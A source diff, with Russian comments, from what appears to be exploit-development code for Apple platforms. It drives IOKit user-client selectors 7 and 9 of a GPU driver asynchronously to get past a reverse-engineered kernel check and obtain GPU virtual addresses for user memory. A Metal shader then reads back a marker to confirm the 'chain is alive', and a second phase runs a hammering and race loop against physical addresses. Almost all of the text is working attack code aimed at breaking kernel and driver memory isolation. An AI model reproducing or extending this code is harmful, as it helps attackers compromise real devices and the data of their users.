@@ -5563,12 +5563,16 @@ static void *kpListReaderMulti(void *arg)
     id<MTLCommandQueue> mq = mpipe ? [mtl newCommandQueue] : nil;
     if (!mq) { GNOTE( [NSString stringWithFormat:@"FAIL: Metal: %@", merr]); gGartLive = NO; return r; }
 
-    // 4. ФАЗА A: sel7 (нули desc, выход РОВНО 0x10) → resourceId → sel9
-    //    (cmd как structureInput 0x58: [0]=0x80, [7]=resourceId, [8]=userVA,
-    //    [9]=size, [10]=npages) → GPU VA в выходе (out[0] или out[6]).
+    // 4. ФАЗА A: sel7 → resourceId → sel9 через IOConnectCallAsyncMethod
+    //    (у него есть reference — проверка cbz x24 на 0x9e71710 пройдёт;
+    //    IOConnectCallMethod давал NULL → BadArgument). cmd[3]=size (cbz x3),
+    //    cmd[7]=resourceId, cmd[8]=userVA, cmd[9]=size, cmd[10]=npages.
     uint64_t resId = 0;
+    mach_port_t wake = MACH_PORT_NULL;
+    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wake);
+    uint64_t ref[8] = {1,0,0,0,0,0,0,0};
     {
-        uint8_t desc[0x408]; memset(desc, 0, sizeof desc);   // init не читает (RE)
+        uint8_t desc[0x408]; memset(desc, 0, sizeof desc);
         uint8_t out16[0x10]; memset(out16, 0, sizeof out16);
         size_t outSz = 0x10;
         kern_return_t kr7 = IOConnectCallMethod(conn, 7,
@@ -5584,6 +5588,7 @@ static void *kpListReaderMulti(void *arg)
     {
         uint64_t cmd[17]; memset(cmd, 0, sizeof cmd);
         cmd[0] = 0x80;
+        cmd[3] = 0x8000;
         cmd[4] = (uint64_t)mem;
         cmd[5] = 0x8000;
         cmd[6] = 1;
@@ -5595,20 +5600,32 @@ static void *kpListReaderMulti(void *arg)
         uint32_t outScalCnt = 8;
         io_struct_inband_t outS; memset(outS, 0, sizeof outS);
         size_t outSCnt = sizeof outS;
-        kern_return_t kr9 = IOConnectCallMethod(conn, 9,
-                                                NULL, 0,
-                                                cmd, sizeof cmd,
-                                                outScal, &outScalCnt,
-                                                outS, &outSCnt);
-        GNOTE( [NSString stringWithFormat:@"  A: sel9 kr=%#x outScalCnt=%u outSCnt=%zu", kr9, outScalCnt, outSCnt]);
+        kern_return_t kr9 = IOConnectCallAsyncMethod(conn, 9, wake,
+                                                     ref, 8,
+                                                     NULL, 0,
+                                                     cmd, sizeof cmd,
+                                                     outScal, &outScalCnt,
+                                                     outS, &outSCnt);
+        GNOTE( [NSString stringWithFormat:@"  A: sel9(async) kr=%#x outScalCnt=%u outSCnt=%zu", kr9, outScalCnt, outSCnt]);
         for (int i = 0; i < 8; i++) GNOTE( [NSString stringWithFormat:@"    scal[%d]=%#llx", i, outScal[i]]);
         uint64_t *o64 = (uint64_t *)outS;
         for (int i = 0; i < 12; i++) GNOTE( [NSString stringWithFormat:@"    out[%d]=%#llx", i, o64[i]]);
         vaA = o64[0];
         if (!vaA) vaA = o64[6];
         if (!vaA) vaA = outScal[0];
+        // если синхронно пусто — reply на wake
+        if (!vaA && wake != MACH_PORT_NULL) {
+            uint8_t reply[0x400]; memset(reply, 0, sizeof reply);
+            mach_msg_header_t *mh = (mach_msg_header_t *)reply;
+            mh->msgh_size = sizeof reply;
+            mh->msgh_local_port = wake;
+            kern_return_t mkr = mach_msg(mh, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof reply, wake, 1500, MACH_PORT_NULL);
+            GNOTE( [NSString stringWithFormat:@"  A: wake reply kr=%#x id=%u size=%u", mkr, mh->msgh_id, mh->msgh_size]);
+            uint64_t *r64 = (uint64_t *)reply;
+            for (int i = 0; i < 24; i++) GNOTE( [NSString stringWithFormat:@"    reply[%d]=%#llx", i, r64[i]]);
+            for (int i = 4; i < 24; i++) if (r64[i] > 0x100000000ULL && r64[i] < 0x2000000000000ULL) { vaA = r64[i]; break; }
+        }
     }
-    // читаем кандидата VA: маркер 0xAAAA = цепь жива
     if (vaA) {
         ((volatile uint64_t *)res.contents)[0] = 0;
         ((volatile uint64_t *)res.contents)[1] = vaA;
@@ -5627,9 +5644,9 @@ static void *kpListReaderMulti(void *arg)
         GNOTE( [NSString stringWithFormat:@"  A: шейдер по VA=%#llx прочитал %#llx %@", vaA, gotA,
                    gotA == 0xAAAAAAAAAAAAAAAAULL ? @"— НАШ МАРКЕР, ЦЕПЬ ЖИВА!" :
                    gotA == 0x4142434445464748ULL ? @"— сентинель (без молота?!)" : @"(чужое/нуль)"]);
-    } else GNOTE( @"  A: VA=0 — sel9 не вернул адрес (смотри kr/outputs выше)");
+    } else GNOTE( @"  A: VA=0 — sel9 не вернул адрес (смотри kr/outputs/reply выше)");
 
-    // 5. ФАЗА B: молот + цикл sel9 (только если A показала живую цепь)
+    // 5. ФАЗА B: молот + цикл sel9 async (только если A показала живую цепь)
     if (vaA == 0) { GNOTE( @"  B: ПРОПУСК — цепь не подтверждена"); goto out_m; }
     gRaceBufs[0] = bufVA; gRaceN = 1; gRacePA = paX; gRaceStop = 0;
     {
@@ -5639,6 +5656,7 @@ static void *kpListReaderMulti(void *arg)
         for (int it = 0; it < 500 && !hits; it++) {
             uint64_t cmd[17]; memset(cmd, 0, sizeof cmd);
             cmd[0] = 0x80;
+            cmd[3] = 0x8000;
             cmd[4] = (uint64_t)mem;
             cmd[5] = 0x8000;
             cmd[6] = 1;
@@ -5650,11 +5668,12 @@ static void *kpListReaderMulti(void *arg)
             uint32_t outScalCnt = 8;
             io_struct_inband_t outS; memset(outS, 0, sizeof outS);
             size_t outSCnt = sizeof outS;
-            kern_return_t kr9 = IOConnectCallMethod(conn, 9,
-                                                    NULL, 0,
-                                                    cmd, sizeof cmd,
-                                                    outScal, &outScalCnt,
-                                                    outS, &outSCnt);
+            kern_return_t kr9 = IOConnectCallAsyncMethod(conn, 9, wake,
+                                                         ref, 8,
+                                                         NULL, 0,
+                                                         cmd, sizeof cmd,
+                                                         outScal, &outScalCnt,
+                                                         outS, &outSCnt);
             uint64_t vaB = ((uint64_t *)outS)[0];
             if (!vaB) vaB = ((uint64_t *)outS)[6];
             if (!vaB) vaB = outScal[0];
